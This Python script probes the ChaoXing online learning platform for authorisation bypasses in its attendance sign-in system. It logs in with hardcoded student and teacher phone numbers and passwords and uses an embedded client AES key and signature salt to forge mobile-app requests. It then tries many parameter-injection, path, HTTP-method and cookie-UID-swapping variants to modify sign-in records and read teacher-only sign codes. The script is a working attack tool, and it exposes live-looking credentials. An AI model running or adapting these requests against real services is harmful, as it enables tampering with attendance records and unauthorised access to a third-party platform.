#!/usr/bin/env python3
"""Deep testing of sign-in status modification vulnerabilities on ChaoXing platform."""

import base64, hashlib, json, uuid, requests, urllib3, time, sys, re
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"
API = "https://mooc1-api.chaoxing.com"

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"

bypass_results = []
success_results = []

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get(f"{API}/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

def check_bypass(label, resp_text, is_success_check=False):
    """Check if response indicates a bypass or success."""
    if resp_text is None:
        return
    rt = str(resp_text)
    is_500 = "500 Internal Server Error" in rt
    is_404 = "404" in rt and ("Not Found" in rt or "404" in rt[:50])
    is_blocked = "无权限" in rt or rt.strip() == "false" or rt.strip() == "False"
    
    if is_blocked:
        print(f"  [{label}] 阻止: {rt[:200]}")
    elif is_500:
        print(f"  [{label}] 服务器500错误: {rt[:100]}")
    elif is_404:
        print(f"  [{label}] 404未找到")
    else:
        bypass_results.append(label)
        print(f"  [{label}] !!!BYPASS!!! 响应: {rt[:300]}")
        if is_success_check:
            success_results.append(label)

def try_request(session, method, url, **kwargs):
    """Try a request and return response text."""
    try:
        if method == "GET":
            r = session.get(url, **kwargs, timeout=30)
        elif method == "POST":
            r = session.post(url, **kwargs, timeout=30)
        elif method == "PUT":
            r = session.put(url, **kwargs, timeout=30)
        elif method == "PATCH":
            r = session.patch(url, **kwargs, timeout=30)
        elif method == "DELETE":
            r = session.delete(url, **kwargs, timeout=30)
        else:
            r = session.get(url, **kwargs, timeout=30)
        return r.text
    except Exception as e:
        return f"EXCEPTION: {e}"

def get_sign_activities(session, puid):
    """Get sign-in activities using multiple methods."""
    activities = []
    
    # Method 1: backclazzdata via mooc1-api
    url = f"{API}/mooc-ans/mycourse/backclazzdata"
    params = {"view": "json", "courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid, "m": "0"}
    try:
        r = session.get(url, params=params, timeout=30)
        data = safe_json(r)
        if isinstance(data, dict):
            if "data" in data and isinstance(data["data"], dict):
                for item in data["data"].get("activeList", []):
                    if item.get("activeType") == 2:
                        activities.append(item)
            if not activities and "channelList" in data:
                for ch in data["channelList"]:
                    content = ch.get("content", {})
                    if isinstance(content, dict):
                        for item in content.get("activeList", []):
                            if item.get("activeType") == 2:
                                activities.append(item)
    except Exception as e:
        print(f"  backclazzdata失败: {e}")
    
    return activities

def create_sign_activity(tea_sess, puid_t):
    """Create a sign-in activity as teacher using various endpoints."""
    params = {
        "courseId": COURSE_ID,
        "classId": CLASS_ID,
        "uid": puid_t,
        "signType": "0",
        "isQR": "0",
        "duration": "5",
    }
    
    # Try multiple endpoints
    endpoints = [
        f"{BASE}/pptSign/insertSign",
        f"{API}/mooc-ans/pptSign/insertSign",
        f"{API}/pptSign/insertSign",
    ]
    
    for url in endpoints:
        try:
            r = tea_sess.post(url, data=params, timeout=30)
            data = safe_json(r)
            ep = url.split("chaoxing.com")[1]
            print(f"  创建签到({ep}): status={r.status_code}")
            if isinstance(data, dict) and data.get("result") == 1:
                aid = data.get("data", {}).get("activeId") if isinstance(data.get("data"), dict) else None
                if not aid:
                    aid = data.get("activeId")
                if aid:
                    return str(aid)
        except Exception as e:
            print(f"  创建签到失败: {e}")
    
    # Wait and try to get from activity list
    time.sleep(2)
    acts = get_sign_activities(tea_sess, puid_t)
    if acts:
        return str(acts[0].get("activeId"))
    
    return None


def main():
    print("=" * 80)
    print("ChaoXing 签到状态修改深度测试")
    print("=" * 80)

    # Login
    print("\n[*] 登录学生账号...")
    stu_sess, puid_s = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"  学生PUID: {puid_s}")

    print("[*] 登录教师账号...")
    tea_sess, puid_t = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"  教师PUID: {puid_t}")

    if not puid_s or not puid_t:
        print("!!! 登录失败，退出")
        sys.exit(1)

    # Get activities
    print("\n[*] 获取签到活动列表...")
    activities = get_sign_activities(stu_sess, puid_s)
    if not activities:
        print("  学生端无活动，尝试教师端...")
        activities = get_sign_activities(tea_sess, puid_t)
    
    if not activities:
        print("  无现有活动，尝试创建...")
        created_aid = create_sign_activity(tea_sess, puid_t)
        if created_aid:
            activities = [{"activeId": created_aid, "name": "created", "activeType": 2}]
    
    if activities:
        print(f"  找到 {len(activities)} 个签到活动")
        for a in activities[:5]:
            print(f"    - activeId={a.get('activeId')}")
    else:
        print("  [!] 无法获取或创建签到活动，使用模拟activeId继续测试")
        activities = [{"activeId": "1", "name": "dummy", "activeType": 2}]

    # Use first activity
    aid = str(activities[0].get("activeId", "1"))
    print(f"\n  使用 activeId={aid} 进行测试")

    # ==========================================
    # Part 1: Get recordId from V2 signIn
    # ==========================================
    print("\n" + "=" * 80)
    print("Part 1: 从V2 signIn获取recordId")
    print("=" * 80)

    record_infos = []
    for i, act in enumerate(activities[:5]):
        a_id = str(act.get("activeId"))
        if not a_id or a_id == "1":
            continue
        # Try both domains for V2 API
        for domain in [BASE, API]:
            url = f"{domain}/v2/apis/sign/signIn"
            params = {"activeId": a_id, "uid": puid_s}
            try:
                r = stu_sess.get(url, params=params, timeout=30)
                data = safe_json(r)
                print(f"\n  活动 {i+1} (activeId={a_id}, domain={domain.split('//')[1][:20]}):")
                print(f"  完整响应: {json.dumps(data, ensure_ascii=False, indent=2)[:800]}")

                if isinstance(data, dict) and "data" in data and data["data"] is not None:
                    d = data["data"]
                    record_id = d.get("id") or d.get("recordId")
                    status = d.get("status")
                    print(f"    recordId/id: {record_id}")
                    print(f"    status: {status}")
                    print(f"    所有字段: {list(d.keys())}")
                    for k, v in d.items():
                        print(f"      {k}: {v}")
                    if record_id:
                        record_infos.append({
                            "recordId": record_id,
                            "activeId": a_id,
                            "status": status,
                            "full_data": d
                        })
                        break  # Found on this domain, no need to try other
            except Exception as e:
                print(f"  请求失败: {e}")

    if not record_infos:
        print("\n  [!] 未获取到任何recordId")
        # Try teacher session to get student records
        print("  尝试用教师session获取签到列表...")
        for i, act in enumerate(activities[:3]):
            a_id = str(act.get("activeId"))
            if not a_id or a_id == "1":
                continue
            for domain in [BASE, API]:
                url = f"{domain}/pptSign/refeashSignList4Json2"
                params = {"activeId": a_id, "uid": puid_t, "courseId": COURSE_ID, "classId": CLASS_ID}
                try:
                    r = tea_sess.get(url, params=params, timeout=30)
                    data = safe_json(r)
                    print(f"  教师获取签到列表 (activeId={a_id}): {json.dumps(data, ensure_ascii=False)[:500]}")
                    # Try to extract recordId from the list
                    if isinstance(data, dict) and "data" in data:
                        items = data["data"] if isinstance(data["data"], list) else []
                        for item in items:
                            if isinstance(item, dict) and item.get("uid") == puid_s:
                                rid = item.get("id") or item.get("recordId")
                                if rid:
                                    record_infos.append({
                                        "recordId": rid,
                                        "activeId": a_id,
                                        "status": item.get("status"),
                                        "full_data": item
                                    })
                                    print(f"    从教师列表获取到recordId: {rid}")
                except Exception as e:
                    print(f"  教师获取失败: {e}")

    rid = str(record_infos[0]["recordId"]) if record_infos else "unknown"
    aid = str(record_infos[0]["activeId"]) if record_infos else aid
    print(f"\n  测试参数: recordId={rid}, activeId={aid}")

    # ==========================================
    # Part 2: Test recordId-based modification
    # ==========================================
    print("\n" + "=" * 80)
    print("Part 2: 基于recordId的修改测试")
    print("=" * 80)

    if rid != "unknown":
        param_variants = [
            {"id": rid, "status": "2", "activeId": aid, "uid": puid_s},
            {"recordId": rid, "status": "2", "activeId": aid, "uid": puid_s},
            {"signId": rid, "status": "2", "activeId": aid, "uid": puid_s},
        ]

        endpoints = [
            "/newsign/updateSignRecord",
            "/pptSign/updateSignRecord",
            "/v2/apis/sign/updateRecord",
            "/v2/apis/sign/modifyRecord",
            "/pptSign/updateSignStatus",
            "/newsign/updateSignStatus",
        ]

        for ep in endpoints:
            print(f"\n  端点: {ep}")
            for domain in [BASE, API]:
                for pi, params in enumerate(param_variants):
                    label = f"Part2:{ep}:param_{pi}:{domain.split('//')[1][:15]}"
                    url = f"{domain}{ep}"
                    resp = try_request(stu_sess, "POST", url, data=params)
                    check_bypass(label, resp, is_success_check=True)
    else:
        print("  跳过 - 无可用recordId")

    # ==========================================
    # Part 3: Test refeashSignList4Json2 bypass
    # ==========================================
    print("\n" + "=" * 80)
    print("Part 3: refeashSignList4Json2 绕过测试")
    print("=" * 80)

    base_params = {"activeId": aid, "uid": puid_s, "courseId": COURSE_ID, "classId": CLASS_ID}

    bypass_techniques = [
        ("添加isTeacherViewOpen=1", {**base_params, "isTeacherViewOpen": "1"}, "GET", None, None),
        ("DB_STRATEGY参数", {**base_params, "DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId"}, "GET", None, None),
        ("JSON Content-Type", base_params, "POST", {"Content-Type": "application/json"}, True),
        ("PC浏览器UA", base_params, "GET", {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}, False),
        ("添加教师uid参数", {**base_params, "teacherUid": puid_t, "tuid": puid_t}, "GET", None, False),
        ("POST方法", base_params, "POST", None, False),
        ("activeid小写", {**base_params, "activeid": aid}, "GET", None, False),
        ("activityId参数", {**base_params, "activityId": aid}, "GET", None, False),
        ("signId参数", {**base_params, "signId": aid}, "GET", None, False),
        ("路径变体-尾部斜杠", base_params, "GET", None, None, "/pptSign/refeashSignList4Json2/"),
        ("路径变体-分号", base_params, "GET", None, None, "/pptSign/refeashSignList4Json2;"),
        ("POST+JSON+isTeacherViewOpen", {**base_params, "isTeacherViewOpen": "1"}, "POST", {"Content-Type": "application/json"}, True),
        ("POST+DB_STRATEGY+JSON", {**base_params, "DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId"}, "POST", {"Content-Type": "application/json"}, True),
        ("添加fid参数", {**base_params, "fid": "-1"}, "GET", None, False),
        ("添加_v参数(时间戳)", {**base_params, "_v": str(int(time.time()*1000))}, "GET", None, False),
    ]

    for technique in bypass_techniques:
        desc = technique[0]
        params = technique[1]
        method = technique[2]
        extra_headers = technique[3]
        use_json = technique[4] if len(technique) > 4 else False
        path_override = technique[5] if len(technique) > 5 else None
        
        ep = path_override or "/pptSign/refeashSignList4Json2"
        
        for domain in [BASE, API]:
            label = f"Part3:refeashSignList4Json2:{desc}:{domain.split('//')[1][:15]}"
            url = f"{domain}{ep}"
            kwargs = {}
            if extra_headers:
                kwargs["headers"] = extra_headers
            if method == "GET":
                kwargs["params"] = params
                resp = try_request(stu_sess, "GET", url, **kwargs)
            else:
                if use_json:
                    kwargs["json"] = params
                else:
                    kwargs["data"] = params
                resp = try_request(stu_sess, "POST", url, **kwargs)
            check_bypass(label, resp)

    # ==========================================
    # Part 4: Test resetUserSignStatus bypass
    # ==========================================
    print("\n" + "=" * 80)
    print("Part 4: resetUserSignStatus 绕过测试")
    print("=" * 80)

    reset_base = {"activeId": aid, "uid": puid_s, "courseId": COURSE_ID, "classId": CLASS_ID}

    reset_techniques = [
        ("基本参数", reset_base, "GET", None, False, None),
        ("POST方法", reset_base, "POST", None, False, None),
        ("isTeacherViewOpen=1", {**reset_base, "isTeacherViewOpen": "1"}, "GET", None, False, None),
        ("DB_STRATEGY参数", {**reset_base, "DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId"}, "GET", None, False, None),
        ("JSON Content-Type", reset_base, "POST", {"Content-Type": "application/json"}, True, None),
        ("PC浏览器UA", reset_base, "GET", {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, False, None),
        ("添加教师uid", {**reset_base, "teacherUid": puid_t}, "GET", None, False, None),
        ("status=1", {**reset_base, "status": "1"}, "GET", None, False, None),
        ("recordId参数", {**reset_base, "recordId": rid}, "GET", None, False, None),
        ("POST+JSON+recordId", {**reset_base, "recordId": rid, "status": "1"}, "POST", {"Content-Type": "application/json"}, True, None),
        ("POST+isTeacherViewOpen", {**reset_base, "isTeacherViewOpen": "1"}, "POST", None, False, None),
        ("POST+DB_STRATEGY+JSON", {**reset_base, "DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId"}, "POST", {"Content-Type": "application/json"}, True, None),
        ("路径变体-尾部斜杠", reset_base, "GET", None, False, "/pptSign/resetUserSignStatus/"),
        ("路径变体-分号", reset_base, "GET", None, False, "/pptSign/resetUserSignStatus;"),
        ("uid=教师uid", {**reset_base, "uid": puid_t}, "POST", None, False, None),
        ("添加fid参数", {**reset_base, "fid": "-1"}, "POST", None, False, None),
    ]

    for technique in reset_techniques:
        desc = technique[0]
        params = technique[1]
        method = technique[2]
        extra_headers = technique[3]
        use_json = technique[4]
        path_override = technique[5]
        
        ep = path_override or "/pptSign/resetUserSignStatus"
        
        for domain in [BASE, API]:
            label = f"Part4:resetUserSignStatus:{desc}:{domain.split('//')[1][:15]}"
            url = f"{domain}{ep}"
            kwargs = {}
            if extra_headers:
                kwargs["headers"] = extra_headers
            if method == "GET":
                kwargs["params"] = params
                resp = try_request(stu_sess, "GET", url, **kwargs)
            else:
                if use_json:
                    kwargs["json"] = params
                else:
                    kwargs["data"] = params
                resp = try_request(stu_sess, "POST", url, **kwargs)
            check_bypass(label, resp)

    # ==========================================
    # Part 5: Test updateSignStatus with different params
    # ==========================================
    print("\n" + "=" * 80)
    print("Part 5: updateSignStatus 不同参数组合测试")
    print("=" * 80)

    # 5.1 With recordId
    if rid != "unknown":
        print("\n  5.1 使用recordId参数:")
        for domain in [BASE, API]:
            label = f"Part5:updateSignStatus:recordId:{domain.split('//')[1][:15]}"
            resp = try_request(stu_sess, "POST", f"{domain}/pptSign/updateSignStatus",
                             data={"id": rid, "status": "1", "activeId": aid, "uid": puid_s})
            check_bypass(label, resp, is_success_check=True)

    # 5.2 With uids
    print("\n  5.2 使用uids参数:")
    for domain in [BASE, API]:
        label = f"Part5:updateSignStatus:uids:{domain.split('//')[1][:15]}"
        resp = try_request(stu_sess, "POST", f"{domain}/pptSign/updateSignStatus",
                         data={"uids": puid_s, "status": "1", "activeId": aid})
        check_bypass(label, resp, is_success_check=True)

    # 5.3 Different status values
    print("\n  5.3 不同status值:")
    for st in [0, 1, 2, 3, 4, 5, 6]:
        for domain in [BASE, API]:
            label = f"Part5:updateSignStatus:status={st}:{domain.split('//')[1][:15]}"
            resp = try_request(stu_sess, "POST", f"{domain}/pptSign/updateSignStatus",
                             data={"status": str(st), "activeId": aid, "uid": puid_s})
            check_bypass(label, resp)

    # 5.4 With remark parameter
    print("\n  5.4 添加remark参数:")
    for domain in [BASE, API]:
        label = f"Part5:updateSignStatus:remark:{domain.split('//')[1][:15]}"
        resp = try_request(stu_sess, "POST", f"{domain}/pptSign/updateSignStatus",
                         data={"status": "1", "activeId": aid, "uid": puid_s, "remark": "补签"})
        check_bypass(label, resp)

    # 5.5 DB_STRATEGY parameters
    print("\n  5.5 DB_STRATEGY参数:")
    for domain in [BASE, API]:
        label = f"Part5:updateSignStatus:DB_STRATEGY:{domain.split('//')[1][:15]}"
        resp = try_request(stu_sess, "POST", f"{domain}/pptSign/updateSignStatus",
                         data={"status": "1", "activeId": aid, "uid": puid_s,
                               "DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId"})
        check_bypass(label, resp)

    # 5.6 JSON Content-Type bypass
    print("\n  5.6 JSON Content-Type绕过:")
    for domain in [BASE, API]:
        label = f"Part5:updateSignStatus:JSON:{domain.split('//')[1][:15]}"
        resp = try_request(stu_sess, "POST", f"{domain}/pptSign/updateSignStatus",
                         json={"status": 1, "activeId": aid, "uid": puid_s})
        check_bypass(label, resp, is_success_check=True)

    # 5.7 JSON Content-Type with recordId
    if rid != "unknown":
        print("\n  5.7 JSON Content-Type + recordId:")
        for domain in [BASE, API]:
            label = f"Part5:updateSignStatus:JSON+recordId:{domain.split('//')[1][:15]}"
            resp = try_request(stu_sess, "POST", f"{domain}/pptSign/updateSignStatus",
                             json={"id": rid, "status": 1, "activeId": aid, "uid": puid_s})
            check_bypass(label, resp, is_success_check=True)

    # ==========================================
    # Part 6: Test V2 sign-in record modification via PUT/PATCH
    # ==========================================
    print("\n" + "=" * 80)
    print("Part 6: V2 signIn HTTP方法绕过测试")
    print("=" * 80)

    if rid != "unknown":
        for domain in [BASE, API]:
            v2_url = f"{domain}/v2/apis/sign/signIn"
            d_label = domain.split('//')[1][:15]

            print(f"\n  6.1 PUT方法 ({d_label}):")
            label = f"Part6:PUT:signIn:{d_label}"
            resp = try_request(stu_sess, "PUT", v2_url, json={"id": rid, "status": 2})
            check_bypass(label, resp)

            print(f"\n  6.2 PATCH方法 ({d_label}):")
            label = f"Part6:PATCH:signIn:{d_label}"
            resp = try_request(stu_sess, "PATCH", v2_url, json={"id": rid, "status": 2})
            check_bypass(label, resp)

            print(f"\n  6.3 POST完整body ({d_label}):")
            label = f"Part6:POST:signIn:full:{d_label}"
            resp = try_request(stu_sess, "POST", v2_url, json={"id": rid, "status": 2, "activeId": aid, "uid": puid_s})
            check_bypass(label, resp, is_success_check=True)

            print(f"\n  6.4 DELETE方法 ({d_label}):")
            label = f"Part6:DELETE:signIn:{d_label}"
            resp = try_request(stu_sess, "DELETE", v2_url, params={"id": rid})
            check_bypass(label, resp)

            print(f"\n  6.5 PUT+query参数 ({d_label}):")
            label = f"Part6:PUT:signIn:query:{d_label}"
            resp = try_request(stu_sess, "PUT", v2_url, params={"activeId": aid, "uid": puid_s},
                             json={"id": rid, "status": 2})
            check_bypass(label, resp)

            print(f"\n  6.6 POST form数据 ({d_label}):")
            label = f"Part6:POST:signIn:form:{d_label}"
            resp = try_request(stu_sess, "POST", v2_url, data={"id": rid, "status": "2", "activeId": aid, "uid": puid_s})
            check_bypass(label, resp)
    else:
        print("  跳过 - 无可用recordId")

    # ==========================================
    # Part 7: Test newsign path with recordId
    # ==========================================
    print("\n" + "=" * 80)
    print("Part 7: newsign路径recordId测试")
    print("=" * 80)

    newsign_endpoints = [
        "/newsign/updateSignRecord",
        "/newsign/modifySignRecord",
        "/newsign/deleteSignRecord",
        "/newsign/saveSignRecord",
        "/newsign/insertSignRecord",
        "/newsign/createSignRecord",
    ]

    if rid != "unknown":
        for ep in newsign_endpoints:
            print(f"\n  端点: {ep}")
            for domain in [BASE, API]:
                d_label = domain.split('//')[1][:15]
                # Form data
                for pi, params in enumerate([
                    {"id": rid, "status": "2", "activeId": aid, "uid": puid_s},
                    {"recordId": rid, "status": "2", "activeId": aid, "uid": puid_s},
                ]):
                    label = f"Part7:{ep}:form_{pi}:{d_label}"
                    resp = try_request(stu_sess, "POST", f"{domain}{ep}", data=params)
                    check_bypass(label, resp, is_success_check=True)

                # JSON body
                label = f"Part7:{ep}:json:{d_label}"
                resp = try_request(stu_sess, "POST", f"{domain}{ep}",
                                 json={"id": rid, "status": 2, "activeId": aid, "uid": puid_s})
                check_bypass(label, resp, is_success_check=True)

                # GET method
                label = f"Part7:{ep}:GET:{d_label}"
                resp = try_request(stu_sess, "GET", f"{domain}{ep}",
                                 params={"id": rid, "status": "2", "activeId": aid, "uid": puid_s})
                check_bypass(label, resp)
    else:
        print("  跳过 - 无可用recordId")

    # ==========================================
    # Part 8: autoRefeashSignList4Json2 bypass
    # ==========================================
    print("\n" + "=" * 80)
    print("Part 8: autoRefeashSignList4Json2 绕过测试")
    print("=" * 80)

    auto_base = {"activeId": aid, "uid": puid_s, "courseId": COURSE_ID, "classId": CLASS_ID}

    auto_techniques = [
        ("基本GET", auto_base, "GET", None, False),
        ("POST方法", auto_base, "POST", None, False),
        ("isTeacherViewOpen=1", {**auto_base, "isTeacherViewOpen": "1"}, "GET", None, False),
        ("JSON Content-Type", auto_base, "POST", {"Content-Type": "application/json"}, True),
        ("DB_STRATEGY参数", {**auto_base, "DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId"}, "GET", None, False),
        ("PC浏览器UA", auto_base, "GET", {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, False),
        ("POST+JSON+isTeacherViewOpen", {**auto_base, "isTeacherViewOpen": "1"}, "POST", {"Content-Type": "application/json"}, True),
    ]

    for desc, params, method, extra_headers, use_json in auto_techniques:
        for domain in [BASE, API]:
            d_label = domain.split('//')[1][:15]
            label = f"Part8:autoRefeashSignList4Json2:{desc}:{d_label}"
            url = f"{domain}/pptSign/autoRefeashSignList4Json2"
            kwargs = {}
            if extra_headers:
                kwargs["headers"] = extra_headers
            if method == "GET":
                kwargs["params"] = params
                resp = try_request(stu_sess, "GET", url, **kwargs)
            else:
                if use_json:
                    kwargs["json"] = params
                else:
                    kwargs["data"] = params
                resp = try_request(stu_sess, "POST", url, **kwargs)
            check_bypass(label, resp)

    # ==========================================
    # Part 9: getSignCode bypass
    # ==========================================
    print("\n" + "=" * 80)
    print("Part 9: getSignCode 绕过测试")
    print("=" * 80)

    signcode_base = {"activeId": aid, "uid": puid_s, "courseId": COURSE_ID, "classId": CLASS_ID}

    signcode_techniques = [
        ("基本GET", signcode_base, "GET", None, False),
        ("POST方法", signcode_base, "POST", None, False),
        ("isTeacherViewOpen=1", {**signcode_base, "isTeacherViewOpen": "1"}, "GET", None, False),
        ("JSON Content-Type", signcode_base, "POST", {"Content-Type": "application/json"}, True),
        ("PC浏览器UA", signcode_base, "GET", {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, False),
        ("DB_STRATEGY参数", {**signcode_base, "DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId"}, "GET", None, False),
    ]

    for desc, params, method, extra_headers, use_json in signcode_techniques:
        for domain in [BASE, API]:
            d_label = domain.split('//')[1][:15]
            label = f"Part9:getSignCode:{desc}:{d_label}"
            url = f"{domain}/widget/sign/pcTeaSignController/getSignCode"
            kwargs = {}
            if extra_headers:
                kwargs["headers"] = extra_headers
            if method == "GET":
                kwargs["params"] = params
                resp = try_request(stu_sess, "GET", url, **kwargs)
            else:
                if use_json:
                    kwargs["json"] = params
                else:
                    kwargs["data"] = params
                resp = try_request(stu_sess, "POST", url, **kwargs)
            check_bypass(label, resp)

    # ==========================================
    # Part 10: Cross-endpoint parameter injection
    # ==========================================
    print("\n" + "=" * 80)
    print("Part 10: 跨端点参数注入测试")
    print("=" * 80)

    # 10.1 Using teacher's puid
    print("\n  10.1 使用教师puid参数:")
    for domain in [BASE, API]:
        d_label = domain.split('//')[1][:15]
        label = f"Part10:refeashSignList4Json2:teacherUid:{d_label}"
        resp = try_request(stu_sess, "GET", f"{domain}/pptSign/refeashSignList4Json2",
                         params={"activeId": aid, "uid": puid_t, "courseId": COURSE_ID, "classId": CLASS_ID})
        check_bypass(label, resp)

    # 10.2 V2 API POST new record
    if rid != "unknown":
        print("\n  10.2 V2 API - POST创建新记录:")
        for domain in [BASE, API]:
            d_label = domain.split('//')[1][:15]
            label = f"Part10:V2:POST:newRecord:{d_label}"
            resp = try_request(stu_sess, "POST", f"{domain}/v2/apis/sign/signIn",
                             json={"activeId": aid, "uid": puid_s, "status": 2, "longitude": "0", "latitude": "0"})
            check_bypass(label, resp, is_success_check=True)

        print("\n  10.3 V2 API - PUT修改已有记录:")
        for domain in [BASE, API]:
            d_label = domain.split('//')[1][:15]
            label = f"Part10:V2:PUT:modifyRecord:{d_label}"
            resp = try_request(stu_sess, "PUT", f"{domain}/v2/apis/sign/signIn",
                             params={"activeId": aid, "uid": puid_s},
                             json={"id": rid, "status": 2})
            check_bypass(label, resp, is_success_check=True)

    # 10.4 Cookie injection
    print("\n  10.4 Cookie注入教师UID:")
    for domain in [BASE, API]:
        d_label = domain.split('//')[1][:15]
        label = f"Part10:cookieInjection:updateSignStatus:{d_label}"
        try:
            original_uid = None
            for c in stu_sess.cookies:
                if c.name in ("UID", "_uid"):
                    original_uid = c.value
                    c.value = puid_t
                    break
            resp = try_request(stu_sess, "POST", f"{domain}/pptSign/updateSignStatus",
                             data={"status": "1", "activeId": aid, "uid": puid_s})
            for c in stu_sess.cookies:
                if c.name in ("UID", "_uid") and original_uid:
                    c.value = original_uid
                    break
            check_bypass(label, resp)
        except Exception as e:
            print(f"  [{label}] 异常: {e}")

    # ==========================================
    # Part 11: Verify any successful modifications
    # ==========================================
    print("\n" + "=" * 80)
    print("Part 11: 验证成功修改")
    print("=" * 80)

    if success_results:
        print(f"\n  发现 {len(success_results)} 个潜在成功修改，开始验证...")
        for sr_label in success_results:
            print(f"\n  验证: {sr_label}")
            for act in activities[:3]:
                a_id = str(act.get("activeId"))
                if not a_id or a_id == "1":
                    continue
                for domain in [BASE, API]:
                    try:
                        r = stu_sess.get(f"{domain}/v2/apis/sign/signIn",
                                       params={"activeId": a_id, "uid": puid_s}, timeout=30)
                        data = safe_json(r)
                        current_status = get_status(data)
                        print(f"    activeId={a_id}, domain={domain.split('//')[1][:15]}, status={current_status}")
                    except Exception as e:
                        print(f"    查询失败: {e}")
    else:
        print("  没有需要验证的成功修改")

    # ==========================================
    # Final Summary
    # ==========================================
    print("\n" + "=" * 80)
    print("综合测试报告")
    print("=" * 80)

    print(f"\n总绕过点 (非'无权限'/'false'/500/404响应): {len(bypass_results)}")
    if bypass_results:
        print("  绕过列表:")
        for b in bypass_results:
            print(f"    !!!BYPASS!!! {b}")
    else:
        print("  无绕过点")

    print(f"\n总成功修改点: {len(success_results)}")
    if success_results:
        print("  成功列表:")
        for s in success_results:
            print(f"    !!!SUCCESS!!! {s}")
    else:
        print("  无成功修改")

    print(f"\n获取到的recordId信息: {len(record_infos)} 条")
    for ri in record_infos:
        print(f"  recordId={ri['recordId']}, activeId={ri['activeId']}, status={ri['status']}")

    print(f"\n测试的activeId: {aid}")
    print(f"mobilelearn域名状态: 500错误(服务端问题)")
    print(f"mooc1-api域名状态: 正常")

    print("\n" + "=" * 80)
    print("测试完成")
    print("=" * 80)


if __name__ == "__main__":
    main()
